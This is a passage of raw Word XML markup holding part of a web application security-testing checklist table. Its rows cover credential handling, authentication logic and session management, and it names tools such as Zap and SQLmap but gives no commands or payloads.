        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="0B4A2B97" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>4.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="37770265" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Special Functions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6BA39B8E" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00690DD1" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Developer tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7E937FA2" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="4C609FB4" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="05C70315" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3ECDE29E" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test Account Recovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="7B7BA4C1" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="516C8CC1" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="159D3CB4" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="31DBA332" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="521070BB" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test “remember me”</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="5BC19F48" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00690DD1" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Developer tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="2E0875D5" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="66DBE5BA" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="4C2E9471" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="32017EBB" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test Impersonation Functions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="7E6790F0" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6630528D" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="4A931806" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1D09101A" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>4.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7FBB6EC3" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Credential Handling</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="54952D51" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="0006217C" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Zap, SQLmap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="79F86DA4" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="6B0A93D0" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="080D8A4E" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0A7F89F0" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test Username Uniqueness</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="59DB671F" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="510FED2C" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="19036B87" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0FD582CF" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0D07F693" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test Credential Predictability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="058B21CC" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="459C5205" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="18D008B7" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3340C820" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="574A424C" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Check for Unsafe Transmission of Credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="56DE532C" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Zap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="2A29989A" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="1CB86E27" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="7FEB13DE" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="78661F1C" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Check for Insecure Storage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="00C471EF" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>SQLmap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0B537B93" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="5ADDC9E8" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6A66928A" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>4.6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7C109B72" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Authentication Logic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="24286EBC" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3E2CE1C3" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="70BAE14B" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="201" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0997C1D8" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1DF438EA" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test for fail-open logic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3D381A63" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="2C591657" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="149DDDBC" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="100" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1661" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="4C61E458" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>4.7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6281E599" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Exploit Vulnerabilities</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2C52126C" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Pass enum.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="63998C07" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DE1C75" w14:paraId="08924696" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1761" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="07502C13" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="29B77FEA" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Test Session Management</w:t>
            </w:r>
          </w:p>
